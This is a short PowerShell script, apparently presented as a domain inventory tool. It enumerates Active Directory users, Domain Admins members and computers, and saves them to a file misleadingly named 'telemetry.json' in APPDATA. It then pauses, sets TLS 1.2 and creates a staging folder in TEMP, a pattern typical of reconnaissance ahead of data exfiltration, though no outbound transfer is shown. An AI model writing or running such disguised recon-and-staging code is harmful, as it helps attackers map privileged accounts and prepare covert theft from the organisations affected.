
[CmdletBinding()]
param(
    [string]$DomainName = 'contoso.com',
    [string]$ReportPath = "$env:APPDATA\telemetry.json"
)
$ErrorActionPreference = "Continue"

Import-Module ActiveDirectory
Write-Verbose ("Collecting inventory for " + $DomainName)
$DomainInfo = Get-ADDomain -Identity $DomainName
$Users = Get-ADUser -Filter * -Properties LastLogonDate | Select-Object -First 12 SamAccountName,LastLogonDate
$Groups = net group "Domain Admins" /domain
$Computers = Get-ADComputer -Filter * -Properties OperatingSystem | Select-Object -First 12 Name,OperatingSystem
$TransferResult = [PSCustomObject]@{
    Domain = $DomainInfo.Name
    Forest = $DomainInfo.Forest
    Users = $Users
    Groups = $Groups
    Computers = $Computers
}
$TransferResult | ConvertTo-Json -Depth 4 | Out-File -FilePath $ReportPath
Write-Verbose ("Report written to " + $ReportPath)

Start-Sleep -Seconds 33
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
